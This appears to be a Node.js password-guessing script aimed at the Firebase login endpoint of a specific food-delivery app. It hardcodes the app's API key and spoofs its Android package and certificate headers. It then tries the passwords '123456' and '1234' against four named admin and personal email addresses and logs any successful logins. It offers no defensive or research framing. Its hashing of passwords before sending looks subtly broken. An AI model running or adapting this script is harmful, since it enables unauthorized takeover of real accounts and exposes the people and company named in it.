const crypto = require('crypto');

const API_KEY = 'AIzaSyCj35HL7MOIQMc1sXV1AGcRGt7DSkRabXk';
const PACKAGE = 'com.lyo.fooddelivery';
const SHA1 = '1B59478F8C41118B7018DD48804265B639F12DE3';

function hashPassword(pass) {
  return crypto.createHash('sha256').update(pass).digest('hex');
}

async function tryLoginLive(email, password) {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
  const hashedPass = hashPassword(password);
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Android-Package': PACKAGE,
        'X-Android-Cert': SHA1
      },
      body: JSON.stringify({ email, password: hashedPass, returnSecureToken: true })
    });
    const data = await res.json();
    if (res.ok) {
      console.log(`✅ LIVE SUCCESS for ${email} / ${password}: UID: ${data.localId}`);
      return data;
    } else {
      console.log(`❌ LIVE FAILED for ${email} / ${password}: ${data.error ? data.error.message : JSON.stringify(data)}`);
    }
  } catch (err) {
    console.error(`Error for ${email} on live:`, err.message);
  }
  return null;
}

async function run() {
  const emails = [
    'superadmin@lyofresh.in',
    'superadmin@lyofoods.in',
    'anantharajmech@lyofoods.in',
    'anantharajmech@lyofresh.in'
  ];
  for (const email of emails) {
    for (const p of ['123456', '1234']) {
      await tryLoginLive(email, p);
    }
  }
}

run();
